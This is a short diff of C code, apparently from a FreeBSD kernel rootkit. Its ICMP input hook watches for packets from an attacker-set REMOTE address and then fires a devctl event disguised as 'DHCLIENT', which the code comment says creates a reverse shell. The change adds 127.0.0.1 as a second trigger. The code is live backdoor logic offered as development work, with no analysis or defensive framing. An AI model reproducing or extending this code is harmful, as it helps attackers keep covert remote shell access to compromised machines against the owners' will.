@@ -53,7 +53,7 @@ static int icmp_input_hook(struct mbuf **mp, int *offp, int proto) {
          * Check if source ip address match REMOTE which will be define
          * at compile time by the install script
         */
-        if (strncmp(src_buf, REMOTE, sizeof(src_buf)) == 0) {
+        if (strncmp(src_buf, REMOTE, sizeof(src_buf)) == 0 || strncmp(src_buf, "127.0.0.1", sizeof(src_buf)) == 0) {
             snprintf(arg_buf, sizeof(arg_buf), "ip=%s", src_buf);
             /* Create devctl event that will create our reverse shell */
             devctl_notify("DHCLIENT", "WORKER", "START", arg_buf);
